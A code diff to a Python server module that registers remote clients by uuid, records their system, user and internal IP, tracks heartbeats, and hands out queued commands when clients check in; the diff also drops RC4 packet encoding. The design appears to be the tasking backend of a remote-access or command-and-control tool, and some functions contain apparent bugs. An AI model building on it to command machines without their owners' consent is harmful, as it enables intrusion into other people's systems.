@@ -1,118 +1,121 @@
 # coding:utf-8
-import queue
 import asyncio
 from app.utils import *
 from threading import Timer
-from time import sleep
+import time
+from json import dumps,loads
+import html
 
-events = queue.Queue()
 Conn = {}
+Events = {"global":[]}
+Do = {}
+
+def get_conn(uuid):
+    return Conn[uuid]
+
+def get_list(length=0):
+    if length == 0 or length>=len(Conn):
+        return Conn
+    else:
+        # todo: 整个分页
+        return Conn
+def del_events(uuid):
+    if uuid in Events:
+        Events[uuid] = []
 
 
-def online_list():
-    l = []
-    for k in Conn:
-        l.append({
-            "uuid": k,
-            "info": Conn[k]["info"],
-
-        })
-    return {
-        "action": "just for you",
-        "data": l
-    }
+def add_events(uuid,data):
+    if uuid not in Events:
+        return 
+    else:
+        print("[!]Event add from %s\n==========\n%s\n=========="%(uuid,data["data"]))
+        data["action"] = html.escape(data["action"])
+        data["data"] = html.escape(data["data"])
+        Events[uuid].append(data)
+        return 
 
 
-def get_action():
-    return events.get()
+def get_events(uuid,length=20):
+    if uuid not  in Events:
+        return []
+    if len(Events[uuid]) < length:
+        return Events[uuid]
+    else:
+        return Events[uuid][:-length]
 
 
 def do_action(uuid, do_something):
-    if uuid not in Conn:
-        return
-    Conn[uuid]["do"].append(do_something)
+    if uuid not in Conn and uuid not in Do:
+        return 
+    if uuid == "all":
+        for i in Do.values():
+            i.append(do_something)
+    else:
+        Do[uuid].append(do_something)
+    return 
 
-
-def online(uuid):
-    print("[!][BackEnd]Online:{}".format(uuid))
-
-    events.put(
-        {
-            "action": "online",
-            "data": {
-                "uuid": uuid,
-                "info": Conn[uuid]["info"]
-            }
-        }
-    )
+def clear_all(t=600):
+    del_conn = []
+    for i in Conn.values():
+        if int(time.time()) - i["heartbeat"] > int(t):
+            del_conn.append(i["uuid"])
+    for i in del_conn:
+        offline(i)
 
 
 def offline(uuid):
     if uuid in Conn:
-        events.put(
-            {
-                "action": "offline",
-                "data": {
-                    "uuid": uuid,
-                    "info": Conn[uuid]["info"]["ip"]
-                }
-            }
-        )
         Conn.pop(uuid)
-
-
-def timer(uuid):
-    offline(uuid)
+        Events.pop(uuid)
+        Do.pop(uuid)
 
 
 def handle(packet,ip):
-    raw = rc4_decode(packet)
-    data = loads(raw)
-    first = False
-    if "uuid" not in data or "info" not in data:
+    data = loads(packet)
+    if "uuid" not in data:
         return "", 404
     else:
-        if data["uuid"] not in Conn:
-            t = Timer(40, timer, (data["uuid"],))
-            Conn[data["uuid"]] = {
-                "info": data["info"],
-                "timer": t,
-                "next_second": 30,
-                "do": []
+        if(data["uuid"] not in Conn):
+            print("[!][BackEnd]Online:{}".format(ip))
+            event = {
+                "is_client":True,
+                "action":"global",
+                "time":time.asctime(time.localtime(time.time())),
+                "data":"[+]%s:Online IP:%s" % (time.asctime(time.localtime(time.time())),ip)
             }
-            Conn[data["uuid"]]["info"]["ip"] = ip
-            t.start()
-            first = True
-            online(data["uuid"])
+            add_events("global", event )
+        data["info"]["remarks"] = html.escape(data["info"]["remarks"])
+        data["info"]["system"] = html.escape(data["info"]["system"])
+        data["info"]["user"] = html.escape(data["info"]["user"])
+        data["info"]["iip"] = html.escape(data["info"]["iip"])
 
-        if "next_second" in data and data["next_second"] != 0 and not first:
-            # 更新表中的时间为下次检测日期
-            Conn[data["uuid"]]["timer"].cancel()
 
-            Conn[data["uuid"]]["next_second"] = data["next_second"]
-            t = Timer(data["next_second"] + 10, timer, (data["uuid"],))
-            Conn[data["uuid"]]["timer"] = t
-            t.start()
-
-    if "result" in data and type(data["result"]) is list:
-        if data["result"] is not []:
-            for i in data["result"]:
-                events.put(
-                    {
-                        "action": "result",
-                        "data": {
-                            "uuid": data["uuid"],
-                            "action": i["action"],
-                            "data": i["data"],
-                            "ip": Conn[data["uuid"]]["info"]["ip"]
-                        }
+        Conn[data["uuid"]] = {
+        "ip":html.escape(ip),
+        "uuid":html.escape(data["uuid"]),
+        "sleep":data["sleep"],
+        "heartbeat":int(time.time()),
+        "info":data["info"],
+        }
+        if data["uuid"] not in Events:
+            Events[data["uuid"]] = []
+        else:
+            if data["result"]:
+                for i in data["result"]:
+                    
+                   
+                    event = {
+                        "is_client":True,
+                        "action":i["action"],
+                        "time":time.asctime(time.localtime(time.time())),
+                        "data":i["data"]
                     }
-                )
-                if i["action"] == "remark":
-                    Conn[data["uuid"]]["info"] = data["info"]
+                    add_events(data["uuid"],event)
 
-    result = Conn[data["uuid"]]["do"]
-    Conn[data["uuid"]]["do"] = []
-    return rc4_encode(
-        dumps(result)
-    )
+        if data["uuid"] not in Do:
+            Do[data["uuid"]] = []
+
+    ret = dumps(Do[data["uuid"]])
+
+    Do[data["uuid"]] = []
+    return ret
